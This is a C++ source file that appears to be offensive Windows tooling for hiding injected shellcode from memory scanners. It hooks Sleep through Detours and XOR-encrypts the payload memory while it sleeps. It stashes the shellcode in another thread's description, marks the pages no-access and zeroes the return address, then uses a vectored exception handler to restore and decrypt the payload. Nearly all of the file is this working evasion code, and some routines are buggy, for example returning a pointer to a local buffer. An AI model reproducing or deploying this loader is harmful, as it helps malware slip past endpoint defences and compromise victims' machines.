#include <Windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <vector>
#include <iostream>
#include <ctime>
#include <iomanip>
#include <intrin.h>

#include "detours.h"

#pragma comment(lib, "detours.lib")
#pragma comment(lib, "Wininet.lib")

#define DOUT(x) do { std::cout <<x; } while(0)
#define MaxBufferDisc 32768 //max space to write into thread discreption

struct MEMHDR {
	LPVOID addr;
	SIZE_T size;
	DWORD oldprot;
	UCHAR key[10];
	bool encrypted;
};

char buffer[1024]; // buffer that will read the shellcode from memory to write to thread description
HANDLE hThread; // The Thread that we will poisen

typedef void (WINAPI* SLEEP)(DWORD);
typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
HANDLE GetTargetThreadToStore();

static SLEEP fnSleep;	
static HANDLE hOwnProc;
static std::vector<MEMHDR*> memlist;	

static LONG NTAPI VEHHandler(PEXCEPTION_POINTERS pExcepInfo);
static int GetExceptionBaseAddr(DWORD64 addr);
static void WINAPI MySleep(DWORD dwMilliseconds);

void HookingLoader() {
	
	fnSleep = Sleep;
	hOwnProc = GetCurrentProcess();
	hThread = GetTargetThreadToStore();
	if (hThread == NULL) {
		printf("[!] Target Thread is Null \n");
		return;
	}
	std::srand(unsigned(std::time(0)));
	AddVectoredExceptionHandler(1, &VEHHandler);

	DetourRestoreAfterWith();
	DetourTransactionBegin(); 
	DetourUpdateThread(GetCurrentThread());
	DetourAttach((PVOID*)&fnSleep, MySleep);
	DetourTransactionCommit(); 
}


HANDLE GetTargetThreadToStore() {
	HANDLE TargethThread = NULL;
	HANDLE hSnapshot;
	THREADENTRY32 te32;
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		te32.dwSize = sizeof(te32);
		if (Thread32First(hSnapshot, &te32)) {
			do {
				TargethThread = OpenThread(THREAD_SET_LIMITED_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION, FALSE, te32.th32ThreadID);
				if (NULL != TargethThread) {
					printf("[+][Got Target Thread] %d Of Pid : %d \n", te32.th32ThreadID, te32.th32OwnerProcessID);
					return TargethThread;
				}
			} while (Thread32Next(hSnapshot, &te32));
		}
		else {
			printf("[!] Thread32First failed. Error: %d \n", GetLastError());
			return NULL;
		}
		CloseHandle(hSnapshot);
	}
	else {
		printf("[!] CreateToolhelp32Snapshot failed. Error: %d \n", GetLastError());
		return NULL;
	}
}


void SleepIOC(BOOL hook) {
	if (hook == TRUE){
		printf("[#] [SleepIOC] HOOKING IT AGAIN [#] \n");
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach((PVOID*)&fnSleep, MySleep);
		DetourTransactionCommit();
	}
	else if (hook == FALSE) {
		printf("[#] [SleepIOC] UNHOOKIN [#] \n");
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach((PVOID*)&fnSleep, MySleep);
		DetourTransactionCommit();
	}

}



void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

char* mkrndstr(size_t length) {
	static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	char* randomString{};
	char ReturnString[25];
	if (length) {
		randomString = (char*)malloc(length + 1);
		if (randomString) {
			int l = (int)(sizeof(charset) - 1);
			int key;
			for (int n = 0; n < length; n++) {
				key = rand() % l;
				randomString[n] = charset[key];
			}
			randomString[length] = '\0';
		}
	}
	strcpy(ReturnString, randomString);
	free(randomString);
	return ReturnString;
	
}

static void WINAPI GenerateKey(MEMHDR* hMem) {
	ZeroMemory((char*)hMem->key, sizeof(hMem->key));
	strcat((char*)hMem->key, mkrndstr(8));
}



BOOL UnHideInDisc(HANDLE TargethThread, MEMHDR* Sit) {
	HRESULT hr;
	PWSTR pShel;
	char buf[1024]; //buffer that well be read from thread discreption and written to the base address again 
	hr = GetThreadDescription(TargethThread, &pShel); //Take The Thread Discreption and put it in pShel
	if (FAILED(hr)) {
		printf("[UNHIDE][!] GetThreadDescription Failed : %d\n", GetLastError());
		return FALSE;
	}
	printf("[UNHIDE][+] pShel Read From Thread as: 0x%-016p\n", (void*)pShel);
	wcstombs(buf, pShel, sizeof(pShel));
	printf("[UNHIDE][+] buf With The Shellcode : 0x%-016p\n", (void*)buf);
	RtlMoveMemory(Sit->addr, buf, Sit->size); //placing the shellcode back to memory
	printf("[UNHIDE][+] Sit->Address Now Have The Shellcode : 0x%-016p\n", (void*)Sit->addr);
	return TRUE;
}


BOOL HideInDisc(HANDLE TargethThread, MEMHDR* Sit) {
	HRESULT hr;
	PWSTR pwData = NULL;

	SIZE_T lpNumberOfBytesRead = 0; //reading the shellcode from base address into buffer
	BOOL Result = ReadProcessMemory(
		GetCurrentProcess(),
		Sit->addr,
		buffer,
		Sit->size,
		&lpNumberOfBytesRead
	);
	if (Result == FALSE) {
		printf("[HIDE][!] ReadProcessMemory Failed : %d\n", GetLastError());
		printf("[HIDE][+] lpNumberOfBytesRead : %d\n", lpNumberOfBytesRead);
		return FALSE;
	}

	printf("[HIDE][+] buffer With The Shellcode : 0x%-016p\n", (void*)buffer);
	int count = MultiByteToWideChar(CP_ACP, 0, buffer, (int)Sit->size, NULL, 0); //converting shellcode to UTF-16 so that we can write to thread discreption
	if (count != 0) {
		pwData = SysAllocStringLen(0, count);
		MultiByteToWideChar(CP_ACP, 0, buffer, (int)Sit->size, pwData, count);
	}

	RtlZeroMemory(Sit->addr, Sit->size); //cleaning Sit->Address

	printf("[HIDE][+] Sit->Address Is Now Null : 0x%-016p\n", (void*)Sit->addr);
	//printf("[HIDE][+] pwData With The Shellcode : 0x%-016p\n", (void*)pwData);
	hr = SetThreadDescription(TargethThread, pwData); //put pwData as a thread discreption
	if (FAILED(hr)) {
		printf("[HIDE][!] SetThreadDescription Failed : %d\n", GetLastError());
		return FALSE;
	}
	//printf("[HIDE][+] %p Discreption's Now Has The Shellcode \n", TargethThread);

	memset(pwData, 0, lpNumberOfBytesRead);//cleaning pwData
	memset(buffer, 0, lpNumberOfBytesRead);//cleaning buffer
	return TRUE;
}


static void WINAPI MySleep(DWORD dwMilliseconds) {
	printf("[!] MY_SLEEP : Sleep time = %ld\n", dwMilliseconds);

	//saving the real address in origReturnAddress
	// https://github.com/mgeeky/ThreadStackSpoofer
	auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
	const auto origReturnAddress = *overwrite;

	for (MEMHDR* hMem : memlist) {
		GenerateKey(hMem);
		DOUT("[!] Encrypting mem at " << std::hex << hMem->addr << " of size = " << std::dec << hMem->size << " bytes" << std::endl);
		printf("[+] Encrypting [Key : %s]...", (char*)hMem->key);
		XOR((char *) hMem->addr, hMem->size, (char*)hMem->key, sizeof(hMem->key));
		printf("[+] Done\n");
		hMem->encrypted = true;
		HideInDisc(hThread, hMem);
		DOUT("[!] Marking NOACCESS for mem at " << std::hex << hMem->addr << std::endl);
		VirtualProtect(hMem->addr, hMem->size, PAGE_NOACCESS, &(hMem->oldprot));
		//setting the address to zero 
		*overwrite = 0;
	}

	//unhooking
	SleepIOC(FALSE);
	fnSleep(dwMilliseconds);
	DOUT("[!] Out of SLEEP \n");
	//re-hooking sleep
	SleepIOC(TRUE);
	DOUT("[<] Restoring original return address... \n");
	*overwrite = origReturnAddress;
}

static int GetExceptionBaseAddr(DWORD64 addr) {
	int i = 0;
	for (MEMHDR* hMem : memlist) {
		if ((addr < (DWORD64)((char*)hMem->addr + hMem->size)) && addr >= (DWORD64)hMem->addr) {
			DOUT("[!] Memory exception at 0x" << std::noshowbase << std::setw(16) << std::setfill('0') << std::hex << addr << std::endl);
			return i;
		}
		i++;
	}
	DOUT("[-] Memory exception at address not being monitored: " << std::hex << addr << std::endl);
}

static LONG NTAPI VEHHandler(PEXCEPTION_POINTERS pExcepInfo){
	if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005){
		int idx = GetExceptionBaseAddr(pExcepInfo->ContextRecord->Rip);
		if (idx != -1) {
			//DOUT("[!] Shellcode wants to Run. Restoring to RWX and Decrypting\n");
			for (MEMHDR* hMem : memlist) {
				//DOUT("[*]\t\t\t* " << std::hex << hMem->addr << " of size = " << std::dec << hMem->size << " bytes" << std::endl);

				HANDLE hAddr = hMem->addr;
				SIZE_T szMemSize = hMem->size;
				DWORD oldprot = hMem->oldprot;

				VirtualProtectEx(hOwnProc, hAddr, szMemSize, PAGE_EXECUTE_READWRITE, &oldprot);
				if (hMem->encrypted) {
					UnHideInDisc(hThread, hMem);
					printf("[+] Decrypting [Key : %s]...", (char*)hMem->key );
					XOR((char*)hMem->addr, hMem->size, (char*)hMem->key, sizeof(hMem->key));
					printf("[+] Done \n");
					hMem->encrypted = false;
				}
			}
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}